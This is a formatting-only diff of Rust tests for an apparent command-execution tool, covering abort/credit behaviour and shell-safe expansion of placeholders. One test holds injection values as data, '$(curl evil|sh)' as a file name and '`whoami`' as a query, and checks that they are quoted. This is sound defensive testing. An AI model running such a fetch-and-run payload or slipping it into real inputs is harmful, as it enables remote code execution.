@@ -14,10 +14,7 @@ fn temp_dir(tag: &str) -> PathBuf {
     let dir = std::env::temp_dir().join(format!(
         "scout-exec-{tag}-{}-{}",
         std::process::id(),
-        std::time::SystemTime::now()
-            .duration_since(std::time::UNIX_EPOCH)
-            .unwrap()
-            .as_nanos()
+        std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()
     ));
     fs::create_dir_all(&dir).unwrap();
     dir
@@ -74,7 +71,11 @@ fn abort_on_first_failure_no_credit() {
     let dir = temp_dir("abort");
     let (conn, id) = seeded_db(&dir);
 
-    let a = action("fails-first", OnFailure::Abort, vec![spawn_step(&["false"]), spawn_step(&["true"])]);
+    let a = action(
+        "fails-first",
+        OnFailure::Abort,
+        vec![spawn_step(&["false"]), spawn_step(&["true"])],
+    );
     let outcome = execute(&a, &ctx(dir.clone()), Some((&conn, id)));
     assert!(!outcome.any_success);
     assert!(!outcome.credited);
@@ -90,7 +91,11 @@ fn first_success_credits_even_when_later_step_aborts() {
     let dir = temp_dir("credit");
     let (conn, id) = seeded_db(&dir);
 
-    let a = action("succeeds-then-fails", OnFailure::Abort, vec![spawn_step(&["true"]), spawn_step(&["false"])]);
+    let a = action(
+        "succeeds-then-fails",
+        OnFailure::Abort,
+        vec![spawn_step(&["true"]), spawn_step(&["false"])],
+    );
     let outcome = execute(&a, &ctx(dir.clone()), Some((&conn, id)));
     assert!(outcome.any_success);
     assert!(outcome.credited, "credit granted on first success is not retracted by a later abort");
@@ -215,10 +220,7 @@ fn print_seam_quotes_every_placeholder_not_just_paths() {
     let ctx = ExpandCtx { path: &path, query: "`whoami`", home: "/home/u", env: &env };
 
     // {name} — basename can hold shell metacharacters.
-    assert_eq!(
-        t("echo {name}").expand(&ctx, true).unwrap(),
-        "echo '$(curl evil|sh)'"
-    );
+    assert_eq!(t("echo {name}").expand(&ctx, true).unwrap(), "echo '$(curl evil|sh)'");
     // {query} — literally user-typed.
     assert_eq!(t("grep {query}").expand(&ctx, true).unwrap(), "grep '`whoami`'");
     // {env.*} — data, never a command at this seam.
@@ -228,10 +230,7 @@ fn print_seam_quotes_every_placeholder_not_just_paths() {
     let mut env2 = HashMap::new();
     env2.insert("NL".to_string(), "a\nb".to_string());
     let ctx2 = ExpandCtx { path: &path, query: "", home: "/h", env: &env2 };
-    assert_eq!(
-        t("x {env.NL}").expand(&ctx2, true).unwrap_err(),
-        ExpandError::HazardousPath
-    );
+    assert_eq!(t("x {env.NL}").expand(&ctx2, true).unwrap_err(), ExpandError::HazardousPath);
 }
 
 #[test]
@@ -240,10 +239,7 @@ fn undefined_query_is_valid_empty_but_env_is_not() {
     let path = PathBuf::from("/tmp");
     let ctx = ExpandCtx { path: &path, query: "", home: "/h", env: &env };
     assert_eq!(t("q={query}").expand(&ctx, false).unwrap(), "q=");
-    assert!(matches!(
-        t("{env.NOPE}").expand(&ctx, false),
-        Err(ExpandError::UndefinedEnv(_))
-    ));
+    assert!(matches!(t("{env.NOPE}").expand(&ctx, false), Err(ExpandError::UndefinedEnv(_))));
 }
 
 #[test]
@@ -256,10 +252,7 @@ fn repo_root_resolves_through_git_file_or_dir() {
 
     let env = HashMap::new();
     let ctx = ExpandCtx { path: &nested, query: "", home: "/h", env: &env };
-    assert_eq!(
-        t("{repo_root}").expand(&ctx, false).unwrap(),
-        repo.display().to_string()
-    );
+    assert_eq!(t("{repo_root}").expand(&ctx, false).unwrap(), repo.display().to_string());
 
     // Worktree-style .git FILE also counts.
     let wt = dir.join("worktree");
